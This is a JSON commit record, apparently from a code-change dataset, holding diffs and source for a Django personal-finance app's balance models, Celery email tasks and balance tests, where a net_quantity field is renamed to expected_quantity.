),\n        migrations.AddField(\n            model_name='annualbalance',\n            name='owner',\n            field=models.ForeignKey(on_delete=django.db.models.deletion.CASCADE, to=settings.AUTH_USER_MODEL, verbose_name='owner'),\n        ),\n    ]\n"},"\/backend\/djangorest\/balance\/models.py":{"changes":[{"diff":"\n         verbose_name = _('gross quantity'),\n         default = 0\n     )\n-    # expected_quantity - gross_quantity\n-    net_quantity = models.FloatField(\n-        verbose_name = _('net quantity'),\n+    # expected_quantity\n+    expected_quantity = models.FloatField(\n+        verbose_name = _('expected quantity'),\n         default = 0\n     )\n     coin_type = models.Foreig","add":3,"remove":3,"filename":"\/backend\/djangorest\/balance\/models.py","badparts":["    net_quantity = models.FloatField(","        verbose_name = _('net quantity'),"],"goodparts":["    expected_quantity = models.FloatField(","        verbose_name = _('expected quantity'),"]}],"source":"\nfrom email.policy import default import uuid from django.db import models from django.core.validators import MaxValueValidator, MinValueValidator from django.utils.translation import gettext_lazy as _ from coin.models import CoinType from custom_auth.models import User class Balance(models.Model): id=models.BigAutoField( primary_key=True, editable=False ) name=models.CharField( verbose_name=_('name'), max_length=40 ) description=models.CharField( verbose_name=_('description'), max_length=2000, default=\"\" ) quantity=models.FloatField( verbose_name=_('quantity'), validators=[MinValueValidator(0.0)], ) date=models.DateField( verbose_name=_('date') ) coin_type=models.ForeignKey( CoinType, verbose_name=_('coin type'), on_delete=models.DO_NOTHING ) owner=models.ForeignKey( User, verbose_name=_('owner'), on_delete=models.CASCADE ) created=models.DateTimeField(auto_now_add=True) updated=models.DateTimeField(auto_now_add=True) class Meta: verbose_name=_('Balance') verbose_name_plural=_('Balances') abstract=True ordering=['-date'] def __str__(self) -> str: return str(self.name) class DateBalance(models.Model): id=models.UUIDField( primary_key=True, default=uuid.uuid4, editable=False ) gross_quantity=models.FloatField( verbose_name=_('gross quantity'), default=0 ) net_quantity=models.FloatField( verbose_name=_('net quantity'), default=0 ) coin_type=models.ForeignKey( CoinType, verbose_name=_('coin type'), on_delete=models.DO_NOTHING, blank=True, null=True ) owner=models.ForeignKey( User, verbose_name=_('owner'), on_delete=models.CASCADE ) created=models.DateTimeField(auto_now_add=True) updated=models.DateTimeField(auto_now_add=True) class Meta: verbose_name=_('Date balance') verbose_name_plural=_('Date balances') abstract=True ordering=['-created'] def __str__(self) -> str: return str(self.created) class AnnualBalance(DateBalance): year=models.PositiveIntegerField( verbose_name=_('year'), validators=[ MinValueValidator(1), MaxValueValidator(5000), ] ) class Meta(DateBalance.Meta): verbose_name=_('Annual balance') verbose_name_plural=_('Annual balances') def __str__(self) -> str: return str(self.year) class MonthlyBalance(DateBalance): year=models.PositiveIntegerField( verbose_name=_('year'), validators=[ MinValueValidator(1), MaxValueValidator(5000), ] ) month=models.PositiveIntegerField( verbose_name=_('month'), validators=[ MinValueValidator(1), MaxValueValidator(12), ] ) class Meta(DateBalance.Meta): verbose_name=_('Monthly balance') verbose_name_plural=_('Monthly balances') def __str__(self) -> str: return str(self.month)+' -'+str(self.year) ","sourceWithComments":"from email.policy import default\nimport uuid\nfrom django.db import models\nfrom django.core.validators import MaxValueValidator, MinValueValidator\nfrom django.utils.translation import gettext_lazy as _\nfrom coin.models import CoinType\nfrom custom_auth.models import User\n\n\nclass Balance(models.Model):\n    id = models.BigAutoField(\n        primary_key = True,\n        editable = False\n    )\n    name = models.CharField(\n        verbose_name = _('name'),\n        max_length = 40\n    )\n    description = models.CharField(\n        verbose_name = _('description'),\n        max_length = 2000, \n        default = \"\"\n    )\n    quantity = models.FloatField(\n        verbose_name = _('quantity'),\n        validators = [MinValueValidator(0.0)],\n    )\n    date = models.DateField(\n        verbose_name = _('date')\n    )\n    coin_type = models.ForeignKey(\n        CoinType, \n        verbose_name = _('coin type'),\n        on_delete = models.DO_NOTHING\n    )\n    owner = models.ForeignKey(\n        User, \n        verbose_name = _('owner'),\n        on_delete = models.CASCADE\n    )\n    created = models.DateTimeField(auto_now_add=True)\n    updated = models.DateTimeField(auto_now_add=True)\n\n    class Meta:\n        verbose_name = _('Balance')\n        verbose_name_plural = _('Balances')\n        abstract = True\n        # Greater to lower date\n        ordering = ['-date']\n    \n    def __str__(self) -> str:\n        return str(self.name)\n\n\nclass DateBalance(models.Model):\n    id = models.UUIDField(\n        primary_key = True, \n        default = uuid.uuid4, \n        editable = False\n    )\n    # All revenues and expenses\n    gross_quantity = models.FloatField(\n        verbose_name = _('gross quantity'),\n        default = 0\n    )\n    # expected_quantity - gross_quantity\n    net_quantity = models.FloatField(\n        verbose_name = _('net quantity'),\n        default = 0\n    )\n    coin_type = models.ForeignKey(\n        CoinType,\n        verbose_name = _('coin type'),\n        on_delete=models.DO_NOTHING,\n        blank = True,\n        null = True\n    )\n    owner = models.ForeignKey(\n        User,\n        verbose_name = _('owner'),\n        on_delete=models.CASCADE\n    )\n    created = models.DateTimeField(auto_now_add=True)\n    updated = models.DateTimeField(auto_now_add=True)\n\n    class Meta:\n        verbose_name = _('Date balance')\n        verbose_name_plural = _('Date balances')\n        abstract = True\n        ordering = ['-created']\n    \n    def __str__(self) -> str:\n        return str(self.created)\n\nclass AnnualBalance(DateBalance):\n    year = models.PositiveIntegerField(\n        verbose_name = _('year'),\n        validators=[\n            MinValueValidator(1),\n            MaxValueValidator(5000),\n        ]\n    )\n\n    class Meta(DateBalance.Meta):\n        verbose_name = _('Annual balance')\n        verbose_name_plural = _('Annual balances')\n    \n    def __str__(self) -> str:\n        return str(self.year)\n\nclass MonthlyBalance(DateBalance):\n    year = models.PositiveIntegerField(\n        verbose_name = _('year'),\n        validators=[\n            MinValueValidator(1),\n            MaxValueValidator(5000),\n        ]\n    )\n    month = models.PositiveIntegerField(\n        verbose_name = _('month'),\n        validators=[\n            MinValueValidator(1),\n            MaxValueValidator(12),\n        ]\n    )\n\n    class Meta(DateBalance.Meta):\n        verbose_name = _('Monthly balance')\n        verbose_name_plural = _('Monthly balances')\n    \n    def __str__(self) -> str:\n        return str(self.month)+' - '+str(self.year)"},"\/backend\/djangorest\/balance\/tasks.py":{"changes":[{"diff":"\n             user.pref_coin_type,\n             monthly_balance.gross_quantity\n         )\n-    monthly_balance.net_quantity = round(user.expected_monthly_balance \\\n-        - monthly_balance.gross_quantity, 2)\n+    monthly_balance.expected_quantity = round(user.expected_monthly_balance, 2)\n     monthly_balance.save()\n     # Email sent\n     notifications.send_monthly_balance(\n","add":1,"remove":2,"filename":"\/backend\/djangorest\/balance\/tasks.py","badparts":["    monthly_balance.net_quantity = round(user.expected_monthly_balance \\","        - monthly_balance.gross_quantity, 2)"],"goodparts":["    monthly_balance.expected_quantity = round(user.expected_monthly_balance, 2)"]},{"diff":"\n         year,\n         monthly_balance.gross_quantity,\n         user.expected_monthly_balance,\n-        monthly_balance.net_quantity,\n+        monthly_balance.expected_quantity,\n         user.language\n     )\n \n","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tasks.py","badparts":["        monthly_balance.net_quantity,"],"goodparts":["        monthly_balance.expected_quantity,"]},{"diff":"\n             user.pref_coin_type,\n             annual_balance.gross_quantity\n         )\n-    annual_balance.net_quantity = round(user.expected_annual_balance \\\n-        - annual_balance.gross_quantity, 2)\n+    annual_balance.expected_quantity = round(user.expected_annual_balance, 2)\n     annual_balance.save()\n     # Email sent\n     notifications.send_annual_balance(\n","add":1,"remove":2,"filename":"\/backend\/djangorest\/balance\/tasks.py","badparts":["    annual_balance.net_quantity = round(user.expected_annual_balance \\","        - annual_balance.gross_quantity, 2)"],"goodparts":["    annual_balance.expected_quantity = round(user.expected_annual_balance, 2)"]},{"diff":"\n         year,\n         annual_balance.gross_quantity,\n         user.expected_annual_balance,\n-        annual_balance.net_quantity,\n+        annual_balance.expected_quantity,\n         user.language\n  ","add":1,"remove":1,"filename":"\/backend\/djangorest\/balance\/tasks.py","badparts":["        annual_balance.net_quantity,"],"goodparts":["        annual_balance.expected_quantity,"]}],"source":"\nfrom django.utils.timezone import now, timedelta from celery import shared_task from balance.models import AnnualBalance, MonthlyBalance from coin.currency_converter_integration import convert_or_fetch from custom_auth.models import User from balance import notifications import logging logger=logging.getLogger(__name__) @shared_task def send_monthly_balance(user, month, year): monthly_balance, created=MonthlyBalance.objects.get_or_create( owner=user, year=year ) monthly_balance.coin_type=user.pref_coin_type if not created: monthly_balance.gross_quantity=convert_or_fetch( monthly_balance.coin_type, user.pref_coin_type, monthly_balance.gross_quantity ) monthly_balance.net_quantity=round(user.expected_monthly_balance \\ -monthly_balance.gross_quantity, 2) monthly_balance.save() notifications.send_monthly_balance( user.email, month, year, monthly_balance.gross_quantity, user.expected_monthly_balance, monthly_balance.net_quantity, user.language ) @shared_task def send_annual_balance(user, year): annual_balance, created=AnnualBalance.objects.get_or_create( owner=user, year=year ) annual_balance.coin_type=user.pref_coin_type if not created: annual_balance.gross_quantity=convert_or_fetch( annual_balance.coin_type, user.pref_coin_type, annual_balance.gross_quantity ) annual_balance.net_quantity=round(user.expected_annual_balance \\ -annual_balance.gross_quantity, 2) annual_balance.save() notifications.send_annual_balance( user.email, year, annual_balance.gross_quantity, user.expected_annual_balance, annual_balance.net_quantity, user.language ) @shared_task def periodic_monthly_balance(): yesterday=now().date() -timedelta(days=1) month=yesterday.month year=yesterday.year for user in User.objects: if user.verified and user.receive_email_balance: send_monthly_balance(user, month, year).delay() @shared_task def periodic_annual_balance(): yesterday=now().date() -timedelta(days=1) year=yesterday.year for user in User.objects: if user.verified and user.receive_email_balance: send_annual_balance(user, year).delay() ","sourceWithComments":"from django.utils.timezone import now, timedelta\nfrom celery import shared_task\nfrom balance.models import AnnualBalance, MonthlyBalance\nfrom coin.currency_converter_integration import convert_or_fetch\nfrom custom_auth.models import User\nfrom balance import notifications\n\nimport logging\nlogger = logging.getLogger(__name__)\n\n\n@shared_task\ndef send_monthly_balance(user, month, year):\n    monthly_balance, created = MonthlyBalance.objects.get_or_create(\n        owner = user,\n        year = year\n    )\n    monthly_balance.coin_type = user.pref_coin_type\n    # If an monthly_balance already existed, its gross_quantity \n    # must be converted\n    if not created:\n        monthly_balance.gross_quantity = convert_or_fetch(\n            monthly_balance.coin_type, \n            user.pref_coin_type,\n            monthly_balance.gross_quantity\n        )\n    monthly_balance.net_quantity = round(user.expected_monthly_balance \\\n        - monthly_balance.gross_quantity, 2)\n    monthly_balance.save()\n    # Email sent\n    notifications.send_monthly_balance(\n        user.email,\n        month,\n        year,\n        monthly_balance.gross_quantity,\n        user.expected_monthly_balance,\n        monthly_balance.net_quantity,\n        user.language\n    )\n\n@shared_task\ndef send_annual_balance(user, year):\n    annual_balance, created = AnnualBalance.objects.get_or_create(\n        owner = user,\n        year = year\n    )\n    annual_balance.coin_type = user.pref_coin_type\n    # If an annual_balance already existed, its gross_quantity \n    # must be converted\n    if not created:\n        annual_balance.gross_quantity = convert_or_fetch(\n            annual_balance.coin_type, \n            user.pref_coin_type,\n            annual_balance.gross_quantity\n        )\n    annual_balance.net_quantity = round(user.expected_annual_balance \\\n        - annual_balance.gross_quantity, 2)\n    annual_balance.save()\n    # Email sent\n    notifications.send_annual_balance(\n        user.email,\n        year,\n        annual_balance.gross_quantity,\n        user.expected_annual_balance,\n        annual_balance.net_quantity,\n        user.language\n    )\n\n\n@shared_task\ndef periodic_monthly_balance():\n    # Yesterday is last day of month\n    yesterday = now().date() - timedelta(days=1)\n    month = yesterday.month\n    year = yesterday.year\n    for user in User.objects:\n        if user.verified and user.receive_email_balance:\n            send_monthly_balance(user, month, year).delay()\n\n\n@shared_task\ndef periodic_annual_balance():\n    # Yesterday is last day of year\n    yesterday = now().date() - timedelta(days=1)\n    year = yesterday.year\n    for user in User.objects:\n        if user.verified and user.receive_email_balance:\n            send_annual_balance(user, year).delay()"},"\/backend\/djangorest\/balance\/tests\/test_date_balance.py":{"changes":[{"diff":"\n             \"password\": \"password1@212\",\n             \"password2\": \"password1@212\",\n             'inv_code': str(self.inv_code.code),\n-            'pref_coin_type': str(self.coin_type.code)\n+            'pref_coin_type': str(self.coin_type.code),\n+            \"expected_annual_balance\": 10.0,\n+            \"expected_monthly_balance\": 10.0\n         }\n         self.credentials = {\n             'email':\"email1@test.com\",\n","add":3,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_date_balance.py","badparts":["            'pref_coin_type': str(self.coin_type.code)"],"goodparts":["            'pref_coin_type': str(self.coin_type.code),","            \"expected_annual_balance\": 10.0,","            \"expected_monthly_balance\": 10.0"]},{"diff":"\n             email=self.user_data[\"email\"],\n             inv_code=self.inv_code,\n             verified=True,\n-            pref_coin_type=self.coin_type\n+            pref_coin_type=self.coin_type,\n+            expected_annual_balance=self.user_data[\"expected_annual_balance\"],\n+            expected_monthly_balance=self.user_data[\"expected_monthly_balance\"]\n         )\n         user.set_password(self.user_data['password'])\n         user.save()\n","add":3,"remove":1,"filename":"\/backend\/djangorest\/balance\/tests\/test_date_balance.py","badparts":["            pref_coin_type=self.coin_type"],"goodparts":["            pref_coin_type=self.coin_type,","            expected_annual_balance=self.user_data[\"expected_annual_balance\"],","            expected_monthly_balance=self.user_data[\"expected_monthly_balance\"]"]}],"source":"\nimport json from rest_framework import status from rest_framework.test import APITestCase import logging from django.urls import reverse from balance.models import AnnualBalance, MonthlyBalance from coin.models import CoinType from custom_auth.models import InvitationCode, User from expense.models import Expense, ExpenseType from revenue.models import Revenue, RevenueType from django.utils.timezone import now, timedelta class DateBalanceLoicTests(APITestCase): def setUp(self): logging.disable(logging.WARNING) self.jwt_obtain_url=reverse('jwt_obtain_pair') self.expense_url=reverse('expense-list') self.revenue_url=reverse('revenue-list') self.inv_code=InvitationCode.objects.create() self.coin_type=CoinType.objects.create(code='EUR') self.user_data={ 'username':\"username1\", 'email':\"email1@test.com\", \"password\": \"password1@212\", \"password2\": \"password1@212\", 'inv_code': str(self.inv_code.code), 'pref_coin_type': str(self.coin_type.code) } self.credentials={ 'email':\"email1@test.com\", \"password\": \"password1@212\" } user=User.objects.create( username=self.user_data[\"username\"], email=self.user_data[\"email\"], inv_code=self.inv_code, verified=True, pref_coin_type=self.coin_type ) user.set_password(self.user_data['password']) user.save() return super().setUp() def get(self, url): return self.client.get(url) def post(self, url, data={}): return self.client.post( url, json.dumps(data), content_type=\"application\/json\" ) def patch(self, url, data={}): return self.client.patch( url, json.dumps(data), content_type=\"application\/json\" ) def delete(self, url): return self.client.delete(url) def authenticate_user(self, credentials): jwt=self.post(self.jwt_obtain_url, credentials).data['access'] self.client.credentials(HTTP_AUTHORIZATION='Bearer ' +str(jwt)) def get_expense_data(self): exp_type=ExpenseType.objects.create(name='test') return{ 'name': 'Test name', 'description': 'Test description', 'quantity': 2.0, 'coin_type': self.coin_type.code, 'exp_type': exp_type.name, 'date': str(now().date()) } def get_revenue_data(self): rev_type=RevenueType.objects.create(name='test') return{ 'name': 'Test name', 'description': 'Test description', 'quantity': 2.0, 'coin_type': self.coin_type.code, 'rev_type': rev_type.name, 'date': str(now().date()) } def test_revenue_post_date_balances(self): \"\"\" Checks that posting a revenue creates a monthly and annual balance with the revenue quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_revenue_data() response=self.post(self.revenue_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(data['quantity'], last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(data['quantity'], last_annual_balance.gross_quantity) def test_expense_post_date_balances(self): \"\"\" Checks that posting a expense creates a monthly and annual balance with the expense quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_expense_data() response=self.post(self.expense_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(-data['quantity'], last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(-data['quantity'], last_annual_balance.gross_quantity) def test_revenue_delete_date_balances(self): \"\"\" Checks that deleting a revenue creates a monthly and annual balance with the revenue quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_revenue_data() response=self.post(self.revenue_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) rev=Revenue.objects.get(name=data['name']) response=self.delete(self.revenue_url+'\/'+str(rev.id)) self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(0, last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(0, last_annual_balance.gross_quantity) def test_expense_delete_date_balances(self): \"\"\" Checks that deleting a expense creates a monthly and annual balance with the expense quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_expense_data() response=self.post(self.expense_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) exp=Expense.objects.get(name=data['name']) response=self.delete(self.expense_url+'\/'+str(exp.id)) self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(0, last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(0, last_annual_balance.gross_quantity) def test_revenue_update_date_balances(self): \"\"\" Checks that updating a revenue creates a monthly and annual balance with the revenue quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_revenue_data() response=self.post(self.revenue_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) rev=Revenue.objects.get(name=data['name']) past_date=(now() -timedelta(days=32)).date() response=self.patch(self.revenue_url+'\/'+str(rev.id),{ 'date': str(past_date) }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() second_to_last_monthly_balance=MonthlyBalance.objects.get( month=past_date.month ) self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(0, last_monthly_balance.gross_quantity) self.assertEqual(past_date.year, second_to_last_monthly_balance.year) self.assertEqual(past_date.month, second_to_last_monthly_balance.month) self.assertEqual(data['quantity'], second_to_last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(data['quantity'], last_annual_balance.gross_quantity) response=self.patch(self.revenue_url+'\/'+str(rev.id),{ 'date': str(now().date()), 'quantity': 10.14 }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() second_to_last_monthly_balance=MonthlyBalance.objects.get( month=past_date.month ) self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(10.14, last_monthly_balance.gross_quantity) self.assertEqual(past_date.year, second_to_last_monthly_balance.year) self.assertEqual(past_date.month, second_to_last_monthly_balance.month) self.assertEqual(0, second_to_last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(10.14, last_annual_balance.gross_quantity) response=self.patch(self.revenue_url+'\/'+str(rev.id),{ 'quantity': 20.86 }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(20.86, last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(20.86, last_annual_balance.gross_quantity) def test_expense_update_date_balances(self): \"\"\" Checks that updating a expense creates a monthly and annual balance with the expense quantity \"\"\" self.authenticate_user(self.credentials) data=self.get_expense_data() response=self.post(self.expense_url, data) self.assertEqual(response.status_code, status.HTTP_201_CREATED) exp=Expense.objects.get(name=data['name']) past_date=(now() -timedelta(days=32)).date() response=self.patch(self.expense_url+'\/'+str(exp.id),{ 'date': str(past_date) }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() second_to_last_monthly_balance=MonthlyBalance.objects.get( month=past_date.month ) self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(0, last_monthly_balance.gross_quantity) self.assertEqual(past_date.year, second_to_last_monthly_balance.year) self.assertEqual(past_date.month, second_to_last_monthly_balance.month) self.assertEqual(-data['quantity'], second_to_last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(-data['quantity'], last_annual_balance.gross_quantity) response=self.patch(self.expense_url+'\/'+str(exp.id),{ 'date': str(now().date()), 'quantity': 10.14 }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() second_to_last_monthly_balance=MonthlyBalance.objects.get( month=past_date.month ) self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(-10.14, last_monthly_balance.gross_quantity) self.assertEqual(past_date.year, second_to_last_monthly_balance.year) self.assertEqual(past_date.month, second_to_last_monthly_balance.month) self.assertEqual(0, second_to_last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(-10.14, last_annual_balance.gross_quantity) response=self.patch(self.expense_url+'\/'+str(exp.id),{ 'quantity': 20.86 }) self.assertEqual(response.status_code, status.HTTP_200_OK) last_monthly_balance=MonthlyBalance.objects.last() self.assertEqual(now().date().year, last_monthly_balance.year) self.assertEqual(now().date().month, last_monthly_balance.month) self.assertEqual(-20.86, last_monthly_balance.gross_quantity) last_annual_balance=AnnualBalance.objects.last() self.assertEqual(now().date().year, last_annual_balance.year) self.assertEqual(-20.86, last_annual_balance.gross_quantity) ","sourceWithComments":"import json\nfrom rest_framework import status\nfrom rest_framework.test import APITestCase\nimport logging\nfrom django.urls import reverse\nfrom balance.models import AnnualBalance, MonthlyBalance\nfrom coin.models import CoinType\nfrom custom_auth.models import InvitationCode, User\nfrom expense.models import Expense, ExpenseType\nfrom revenue.models import Revenue, RevenueType\nfrom django.utils.timezone import now, timedelta\n\n\nclass DateBalanceLoicTests(APITestCase):\n    def setUp(self):\n        # Avoid WARNING logs while testing wrong requests \n        logging.disable(logging.WARNING)\n\n        self.jwt_obtain_url=reverse('jwt_obtain_pair')\n        self.expense_url=reverse('expense-list')\n        self.revenue_url=reverse('revenue-list')\n        \n        # Create InvitationCodes\n        self.inv_code = InvitationCode.objects.create()\n        self.coin_type = CoinType.objects.create(code='EUR')\n        # User data\n        self.user_data = {\n            'username':\"username1\",\n            'email':\"email1@test.com\",\n            \"password\": \"password1@212\",\n            \"password2\": \"password1@212\",\n            'inv_code': str(self.inv_code.code),\n            'pref_coin_type': str(self.coin_type.code)\n        }\n        self.credentials = {\n            'email':\"email1@test.com\",\n            \"password\": \"password1@212\"\n        }\n        # User creation\n        user = User.objects.create(\n            username=self.user_data[\"username\"],\n            email=self.user_data[\"email\"],\n            inv_code=self.inv_code,\n            verified=True,\n            pref_coin_type=self.coin_type\n        )\n        user.set_password(self.user_data['password'])\n        user.save()\n        return super().setUp()\n    \n    def get(self, url) :\n        return self.client.get(url)\n    \n    def post(self, url, data={}) :\n        return self.client.post(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def patch(self, url, data={}) :\n        return self.client.patch(\n            url, json.dumps(data),\n            content_type=\"application\/json\"\n        )\n    \n    def delete(self, url) :\n        return self.client.delete(url)\n    \n    def authenticate_user(self, credentials):\n        # Get jwt token\n        jwt=self.post(self.jwt_obtain_url, credentials).data['access']\n        self.client.credentials(HTTP_AUTHORIZATION='Bearer ' + str(jwt))\n\n    def get_expense_data(self):\n        exp_type = ExpenseType.objects.create(name='test')\n        return {\n            'name': 'Test name',\n            'description': 'Test description',\n            'quantity': 2.0,\n            'coin_type': self.coin_type.code,\n            'exp_type': exp_type.name,\n            'date': str(now().date())\n        }\n    \n    def get_revenue_data(self):\n        rev_type = RevenueType.objects.create(name='test')\n        return {\n            'name': 'Test name',\n            'description': 'Test description',\n            'quantity': 2.0,\n            'coin_type': self.coin_type.code,\n            'rev_type': rev_type.name,\n            'date': str(now().date())\n        }\n\n\n    def test_revenue_post_date_balances(self):\n        \"\"\"\n        Checks that posting a revenue creates a monthly and annual balance\n        with the revenue quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_revenue_data()\n        # Post revenue\n        response = self.post(self.revenue_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(data['quantity'], last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(data['quantity'], last_annual_balance.gross_quantity)\n\n    def test_expense_post_date_balances(self):\n        \"\"\"\n        Checks that posting a expense creates a monthly and annual balance\n        with the expense quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_expense_data()\n        # Post expense\n        response = self.post(self.expense_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(-data['quantity'], last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(-data['quantity'], last_annual_balance.gross_quantity)\n    \n    def test_revenue_delete_date_balances(self):\n        \"\"\"\n        Checks that deleting a revenue creates a monthly and annual balance\n        with the revenue quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_revenue_data()\n        # Post revenue\n        response = self.post(self.revenue_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        # Delete revenue\n        rev = Revenue.objects.get(name=data['name'])\n        response = self.delete(self.revenue_url+'\/'+str(rev.id))\n        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(0, last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(0, last_annual_balance.gross_quantity)\n    \n    def test_expense_delete_date_balances(self):\n        \"\"\"\n        Checks that deleting a expense creates a monthly and annual balance\n        with the expense quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_expense_data()\n        # Post expense\n        response = self.post(self.expense_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        # Delete expense\n        exp = Expense.objects.get(name=data['name'])\n        response = self.delete(self.expense_url+'\/'+str(exp.id))\n        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(0, last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(0, last_annual_balance.gross_quantity)\n    \n    def test_revenue_update_date_balances(self):\n        \"\"\"\n        Checks that updating a revenue creates a monthly and annual balance\n        with the revenue quantity\n        \"\"\"\n        # Authenticate user\n        self.authenticate_user(self.credentials)\n        data = self.get_revenue_data()\n        # Post revenue\n        response = self.post(self.revenue_url, data)\n        self.assertEqual(response.status_code, status.HTTP_201_CREATED)\n        # Update revenue dfiferent date\n        rev = Revenue.objects.get(name=data['name'])\n        past_date = (now() - timedelta(days=32)).date()\n        response = self.patch(self.revenue_url+'\/'+str(rev.id), {\n            'date': str(past_date)\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        second_to_last_monthly_balance = MonthlyBalance.objects.get(\n            month=past_date.month\n        )\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        self.assertEqual(0, last_monthly_balance.gross_quantity)\n        self.assertEqual(past_date.year, second_to_last_monthly_balance.year)\n        self.assertEqual(past_date.month, second_to_last_monthly_balance.month)\n        self.assertEqual(data['quantity'], \n            second_to_last_monthly_balance.gross_quantity)\n        last_annual_balance = AnnualBalance.objects.last()\n        self.assertEqual(now().date().year, last_annual_balance.year)\n        self.assertEqual(data['quantity'], last_annual_balance.gross_quantity)\n        # Test update diferent quantity and date\n        response = self.patch(self.revenue_url+'\/'+str(rev.id), {\n            'date': str(now().date()),\n            'quantity': 10.14\n        })\n        self.assertEqual(response.status_code, status.HTTP_200_OK)\n        last_monthly_balance = MonthlyBalance.objects.last()\n        second_to_last_monthly_balance = MonthlyBalance.objects.get(\n            month=past_date.month\n        )\n        self.assertEqual(now().date().year, last_monthly_balance.year)\n        self.assertEqual(now().date().month, last_monthly_balance.month)\n        